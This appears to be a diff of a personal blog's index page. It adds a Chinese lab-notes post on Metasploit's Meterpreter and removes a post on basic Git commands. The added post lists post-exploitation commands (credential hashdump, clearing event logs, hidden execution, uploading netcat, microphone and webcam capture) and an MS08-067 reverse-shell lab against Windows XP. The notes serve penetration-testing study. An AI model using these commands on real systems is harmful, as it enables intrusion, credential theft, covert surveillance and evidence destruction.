@@ -240,6 +240,296 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/" itemprop="url">Kali Linux笔记(一百)：Meterpreter Shell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:36:20+08:00">
+                2020-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  960 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
+<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
+<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
+<li>后渗透测试阶段一站式操作界面</li>
+</ul>
+</li>
+<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
+<li>注入合法系统进程并建立stager</li>
+<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
+<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
+<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
+</ul>
+</li>
+<li>服务端使用C语言编写</li>
+<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
+</ul>
+<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
+<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
+<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
+<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
+<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
+<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
+<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
+<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
+<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
+<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
+<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
+<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
+<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
+<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
+<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
+<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
+<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
+<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
+<li>-f：执行的程序</li>
+<li>-i：进行交互性shell</li>
+<li>-H：程序进行隐藏</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
+<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
+<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
+<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
+<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
+<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
+<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
+<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
+<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
+<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
+<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
+<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
+<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
+<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
+<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
+<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
+<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
+<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
+<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
+<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
+<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
+<li>2015年11月份，来自社区的贡献</li>
+<li>▲ 无需运行环境，在客户端运行原生python代码</li>
+<li><strong><code>🔺命令：load python</code></strong><ul>
+<li><strong><code>🔺命令：Help</code></strong></li>
+<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
+<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
+<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">for root,dirs,files in os.walk(&quot;C:\\&quot;):</span><br><span class="line">    for file in files:</span><br><span class="line">        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):</span><br><span class="line">            print(os.path.john(root.file))</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
+<li>Kali主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window XP SP3主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali主机<ul>
+<li><strong><code>🔺命令：msconsole</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：exploit -j</code></strong></li>
+<li><strong><code>🔺命令：sessions -l</code></strong></li>
+<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
+<li><strong><code>🔺命令：meterpreter</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2163,261 +2453,6 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-2%EF%BC%9AGit%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-2%EF%BC%9AGit%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" itemprop="url">Git笔记-2：Git基本操作</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
-                2020-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Git/" itemprop="url" rel="index">
-                    <span itemprop="name">Git</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  481 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h4><ul>
-<li>下载git OXS版本（一般为内置/brew install git安装）</li>
-<li>下载git WindowS版本（Git网页下载Git）</li>
-<li>下载git Linux版本（apt-get install git-all/yum -y install git）</li>
-</ul>
-<h4 id="2-Git的基本命令"><a href="#2-Git的基本命令" class="headerlink" title="2. Git的基本命令"></a>2. Git的基本命令</h4><ul>
-<li>▲ 提交到远程仓库需要在Github上创建一个仓库</li>
-<li>Git的版本<ul>
-<li><strong><code>🔺命令：git version</code></strong></li>
-</ul>
-</li>
-<li>Git的用户信息<ul>
-<li>名字：<strong><code>🔺命令：git config --global user.name &quot;tomas&quot;</code></strong></li>
-<li>邮箱：<strong><code>🔺命令：git config --global user.email &quot;643008933@qq.com&quot;</code></strong></li>
-<li>配置文件：~/.gitconfig（可设置代理，配置信息）</li>
-</ul>
-</li>
-<li>Git的基本命令<ul>
-<li>初始化：<strong><code>🔺命令：git init</code></strong></li>
-<li>仓库状态：<strong><code>🔺命令：git status</code></strong></li>
-<li>添加文件到暂存区管理：<strong><code>🔺命令：git add 文件名</code></strong><ul>
-<li>-A，所有文件</li>
-</ul>
-</li>
-<li>从暂存区删除文件：<strong><code>🔺命令：git rm --cacahe 文件名</code></strong></li>
-<li>查看文件：<strong><code>🔺命令：..git → cat index</code></strong></li>
-<li>提交：<strong><code>🔺命令：git commit -m &quot;文件名&quot;</code></strong><ul>
-<li>-m：描述提交的内容</li>
-</ul>
-</li>
-<li>建立连接：<strong><code>🔺命令：git remote add origin https://.....</code></strong></li>
-<li>查看远端信息：<strong><code>🔺命令：git remote -v</code></strong></li>
-<li>提交本地文件到远端服务器：<strong><code>🔺命令：git push origin master -u</code></strong><ul>
-<li>origin：远端仓库名称</li>
-<li>master：本地仓库名称</li>
-<li>-u：后续不需要输入名称</li>
-<li>:master ：删除远端的分支</li>
-<li>master:m1 ：更改远端分支名称为m1</li>
-</ul>
-</li>
-<li>克隆远程仓库到本地：<strong><code>🔺命令：git clone https://..... git-demo</code></strong><ul>
-<li>git-demo：为拉取到本地仓库的名称</li>
-</ul>
-</li>
-<li>拉取远端仓库修改数据到本地：<strong><code>🔺命令：git pull origin master</code></strong><ul>
-<li>origin：远端仓库名称</li>
-<li>master：本地仓库名称</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-Git-tutorial-Repository"><a href="#3-Git-tutorial-Repository" class="headerlink" title="3. Git-tutorial Repository"></a>3. Git-tutorial Repository</h4><ul>
-<li>mkdir git-tutorial</li>
-<li>cd git-tutorial</li>
-<li>git init</li>
-<li>ll</li>
-<li>touch README.md</li>
-<li>git status</li>
-<li>git add README.md</li>
-<li>git status</li>
-<li>git rm –cacahe README.md</li>
-<li>git status</li>
-<li>git add README.md -A</li>
-<li>git status</li>
-<li>git commit -m “README.md”</li>
-<li>git remote add origin <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>..</li>
-<li>git remote -v</li>
-<li>git push origin master -u</li>
-<li>查看Github是否有新建一个仓库并有README.md</li>
-<li>cd ..</li>
-<li>git clone https://… git-demo</li>
-<li>vim README.md</li>
-<li>Hello world → wq</li>
-<li>git status</li>
-<li>git add README.md</li>
-<li>git commit -m “modify README.md”</li>
-<li>cd ..</li>
-<li>cd git-tutorial</li>
-<li>git pull origin master</li>
-<li>查看Github建立的仓库中的README.md是否有内容</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2472,7 +2507,7 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">126</span>
+                  <span class="site-state-item-count">127</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2579,7 +2614,7 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">112.9k</span>
+    <span title="Site words total count">113.7k</span>
   
 </div>
 
